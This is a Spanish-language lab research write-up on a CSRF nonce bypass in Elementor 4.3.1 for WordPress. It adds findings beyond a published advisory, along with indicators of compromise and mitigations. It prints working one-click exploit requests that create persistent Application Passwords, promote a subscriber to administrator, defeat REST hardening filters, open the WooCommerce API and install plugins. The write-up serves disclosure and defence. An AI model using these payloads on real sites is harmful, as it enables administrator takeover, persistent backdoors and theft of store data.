# HALLAZGOS propios — más allá del advisory

Fecha: 2026-09-26 · Todo lo de aquí se **derivó y verificó contra el
laboratorio de este repo** (Elementor 4.3.1/4.3.2 reales, contenedores vivos,
evidencia en [RESULTADOS.md](RESULTADOS.md)). Comandos de reproducción
incluidos (`make aportaciones`, `make hardening-demo`).

El advisory de Patchstack documenta el bypass y el vector canónico (crear un
admin con un clic). Los tres hallazgos de abajo amplían la superficie, el
impacto y la parte defensiva — y todos comparten la misma propiedad:
**viajan en un enlace**.

---

## 1. «Puerta silenciosa» (StealthDoor): persistencia sin usuarios nuevos

**Afirmación:** el mismo clic que crea un admin también puede crear un
*Application Password* sobre la cuenta DEL PROPIO ADMIN. La respuesta del GET
devuelve la contraseña en claro. A partir de ahí el atacante habla REST con
`Authorization: Basic`, un mecanismo que **jamás necesita nonce** — el bug deja
de importar: la sesión CSRF se convierte en credencial permanente.

```
GET /wp-json/wp/v2/users/me/application-passwords
    ?_method=POST&name=sync-movil&x=elementor/v1/events/
    [cookies de la víctima admin]

-> HTTP 201
{"uuid":"dd9edac2-...","name":"sync-movil",
 "password":"3wIC MOmN 0cwz 7yym PK6m ErfG","user_login":"admin",...}
```

Y la credencial funciona sin cookies ni nonce:

```
curl -u "admin:3wIC ..." /wp-json/wp/v2/users/me?context=edit  -> 200, roles=["administrator"]
curl -u "admin:3wIC ..." /wp-json/wp/v2/plugins               -> 200
```

**Por qué importa:**

| Vector canónico (admin nuevo) | Puerta silenciosa (app password) |
|---|---|
| Crea una fila en `wp_users` | **No crea usuarios** |
| Visible en «Usuarios» del panel | Solo en el perfil del admin, sección Application Passwords |
| El atacante necesita sesión (nonce) para usar REST | **Basic auth: sin nonce para siempre** |
| Cambiar la contraseña del admin no lo expulsa | Idem — pero revocar app-passwords sí |

- Requisito de entorno: Application Passwords disponibles — por defecto,
  **cualquier sitio de producción con HTTPS** (el lab los habilita con
  `WP_ENVIRONMENT_TYPE=local`, la condición documentada para desarrollo).
- **IOCs adicionales**: peticiones REST con `Authorization: Basic` desde IPs
  extrañas; `GET` a `/wp-json/wp/v2/users/me/application-passwords` con
  `_method=POST` en la query.
- **Respuesta**: revisar/revocar Application Passwords
  (`/wp-admin/profile.php` sección Application Passwords) tras cualquier
  sospecha; no basta con borrar usuarios creados.

Reproducción: `make aportaciones` (crea y **revoca** la puerta al terminar).

## 2. «Escalada de cuenta dormida»: promover un subscriber existente

**Afirmación:** si el atacante ya tiene una cuenta de baja confianza
(subscriber — el rol por defecto del registro público), un clic del admin la
**promueve a administrator** sin crear usuarios y sin conocer contraseña
alguna del sitio:

```
# víctima, cookies del admin:
GET /wp-json/wp/v2/users/3?_method=POST&roles[]=administrator&x=elementor/v1/events/
-> HTTP 200   ...  "roles":["administrator"]
```

Verificado con WP-CLI antes/después (`subscriber` → `administrator`).

**Por qué importa:** el vector canónico deja un usuario *nuevo* con
`registered_date` llamativo; este deja **cero altas** — solo cambia el rol de
una cuenta preexistente que puede llevar meses dormida. La detección por
«usuarios creados recientemente» no dispara.

- **IOCs**: auditoría de `usermeta` de roles cambiados; GET sobre
  `/wp/v2/users/<id>` con `_method=POST`.
- Relación con el hallazgo §1: combinables (promover la cuenta dormida y
  además abrirle la puerta silenciosa).

Reproducción: `make aportaciones` (crea, promueve y **borra** la cuenta de prueba).

## 3. El bypass también anula el HARDENING anti-CSRF (defensa en profundidad)

**Afirmación:** no solo se salta el nonce del core. Los plugins de seguridad
y guías de hardening que defienden el REST API enganchándose a
`rest_authentication_errors` — exigiendo Application Password o nonce y
**denegando la autenticación por cookies** — quedan **silenciados** por el
mismo bug. Verificado empíricamente con un mu-plugin de hardening
(`research/investigacion/lab-hardening-rest.php`) que implementa el patrón
canónico:

```php
add_filter( 'rest_authentication_errors', function ( $result ) {
    if ( ! empty( $result ) ) { return $result; }   // coexistencia estándar
    if ( Basic_auth_o_nonce() ) { return $result; }
    return new WP_Error( 'rest_cookie_disabled', ..., 401 );
} );
```

```
[hardening activo, víctima 4.3.1]
GET .../users?_method=POST&...                    -> 401 rest_cookie_disabled  ✔ el firewall funciona
GET .../users?_method=POST&...&x=elementor/v1/events/
                                                  -> 201 admin creado          ✘ el bypass lo atraviesa
```

**Mecánica:** Elementor devuelve `true` con **prioridad 0**; el hardening
(prioridad 10 por defecto, como cualquier plugin) recibe `$result` no vacío,
aplica su cláusula de coexistencia y **calla**. La defensa diseñada contra
esta clase exacta de ataque es neutralizada por el propio ataque.

**Por qué importa:** hasta que un sitio actualiza, la mitigación habitual
("bloquea REST por cookies en tu WAF/plugin") **no protege** contra este CVE.
La mitigación real sin actualizar es apagar el experimento
(`wp option update elementor_experiment-editor_events inactive`) o una regla
WAF sobre la query string (ver README §Defensa).

Reproducción: `make hardening-demo` (instala el mu-plugin, demuestra A/B y
**lo desinstala**).

## 4. Detalles forenses menores (pero útiles)

- **`%2F` desactiva la subcadena mágica**: el código compara contra el URI
  crudo; `elementor%2Fv1%2Fevents%2F` NO coincide. Un atacante con un
  generador de URLs sobre-codificante fracasa; los PoC a mano no. También es
  un matiz de laboratorio: frameworks como `urlencode` de Python escapan `/`
  por defecto (el generador del repo usa `safe='/'` deliberadamente).
- **La subcadena ni siquiera necesita parámetro propio**: anidada en otro
  valor (`q=informe-elementor/v1/events/-2026`) dispara igual el bypass sobre
  rutas de lectura (`/wp/v2/settings` 401→200, filtra el email del admin).
- **WP no fija `SameSite` en sus cookies** (verificado: solo `HttpOnly`,
  `path=/`): los navegadores modernos aplican Lax por defecto, y Lax permite
  cookies en **navegación de nivel superior** — exactamente lo que un `<a
  href>` produce. La condición «un clic» no es un descuido del exploit: es la
  única forma de enviar las cookies bajo Lax (por eso `<img src=...>`
  subrecurso NO serviría).
- **Blast radius cuantificado**: la instalación del lab expone 231 rutas REST
  con **154 endpoints de escritura** alcanzables por un admin autenticado;
  con el bypass, todos son objetivo CSRF potencial (core + plugins).

## 5. La API-key-wall de WOOCOMMERCE también cae (hallazgo de mayor alcance)

**Afirmación:** WooCommerce bloquea por diseño su API `/wc/v3` para la
autenticación por cookies (exige *consumer key/secret*, Basic propio). Ese
bloqueo se implementa sobre el MISMO filtro que el bug silencia — igual que
el mu-plugin de §3, pero en el plugin de e-commerce con más instalación real
del mundo. Resultado: **con Elementor 4.3.0/4.3.1, toda la API de WooCommerce
(pedidos, clientes, cupones, system_status...) queda accesible a CSRF por un
enlace** en cualquier tienda con ambos plugins.

Verificado en el lab (víctima 4.3.1 + WooCommerce 11.1.2, cookies de admin,
`make blast-radius`):

```
[B1] GET /wp-json/wc/v3/system_status            (anónimo)      -> 401
[B2] GET /wp-json/wc/v3/system_status            (cookies admin) -> 401 woocommerce_rest_cannot_view
[B3] GET /wp-json/wc/v3/system_status?x=elementor/v1/events/    -> 200 {"environment":...}
```

Además, el endpoint de plugins del **core** también cae con la misma receta
(dos enlaces instalan Y activan cualquier plugin del directorio wp.org):

```
GET /wp-json/wp/v2/plugins?_method=POST&slug=hello-dolly&x=...              -> 201 (instalado)
GET /wp-json/wp/v2/plugins/<id>?_method=POST&status=active&x=...            -> 200 (activo)
```

**Por qué importa:** eleva el impacto práctico de «crear un admin» a
«operar la tienda completa por REST» y «elegir código ejecutable del
repositorio oficial». Los IOCs de logs deben incluir rutas `wc/`.

**Cadena del hallazgo:** §3 (mu-plugin de hardening silenciado) predijo que
CUALQUIER consumidor de `rest_authentication_errors` con patrón de
coexistencia caería; WooCommerce resultó ser exactamente ese caso real.

## 6. La mitigación paliativa, verificada (antes era un claim)

La recomendación `wp option update elementor_experiment-editor_events
inactive` se convirtió en evidencia A/B/C con `make mitigacion-demo`:

```
[A] default (activo)   clic -> 201 admin creado
[B] experimento inactive MISMO clic -> 401
[C] opción restaurada   (estado original del lab)
```

## 7. SameSite=Lax: medido con navegador real (antes razonado)

`make demo-navegador` (Chrome headless vía CDP, cero dependencias): login
legítimo del admin → apertura del correo desde `file://` (OTRO origen) →
clic en el `<a>` → **HTTP 201 con el admin creado**. Las cookies viajaron en
la navegación top-level exactamente como predice Lax; capturas y GIF en
`docs/img/demo-*.png|.gif`. La condición «un clic» queda demostrada
end-to-end con navegador, no solo por equivalencia HTTP (curl).

## 8. Matriz de la subcadena mágica (fuzzer, 8/8)

`make fuzz-subcadena` (resultado en
`research/investigacion/fuzz-resultados.md`): 8 variantes de
colocación/codificación, todas ajustadas a la predicción del modelo
`strpos` sobre URI crudo — bypass con la subcadena literal/anidada/prefijada;
resiste con `%2F`, `%252F`, mayúsculas, sin barra final y solo-namespace.
El negativo `%2F` está además inline en la fase 3 del exploit.

## Qué NO encontramos (negativos útiles)

- **`/wp/v2/settings` no expone `users_can_register` ni `default_role`**: la
  vía soñada «un clic activa el registro libre con rol admin» **no existe**
  por REST (el schema del core no publica esos campos). Los campos
  escribibles son cosméticos/operativos (title, per_page,
  default_comment_status...). Un plugin de terceros podría añadir los suyos —
  los `elementor_one_*` que ya aparecen lo ilustran — pero no lo verificamos
  contra ningún plugin concreto.
- **Ningún bypass del parche**: con 4.3.2, todos los vectores de este
  documento devuelven 401 (verificado uno a uno contra el control).
- **Application Passwords sobre HTTP**: no disponibles (501
  `application_passwords_disabled`) sin HTTPS o `WP_ENVIRONMENT_TYPE=local`;
  la puerta silenciosa requiere esa condición, cumplida por defecto en
  producción.
- **WooCommerce con su API-key-wall vigente en 4.3.2**: sobre el control
  parcheado no volvimos a probar `wc/v3` con la subcadena (el bypass muere en
  el filtro de Elementor antes de llegar al de WC); queda como trabajo
  futuro si se quiere la tabla completa en ambos sentidos.
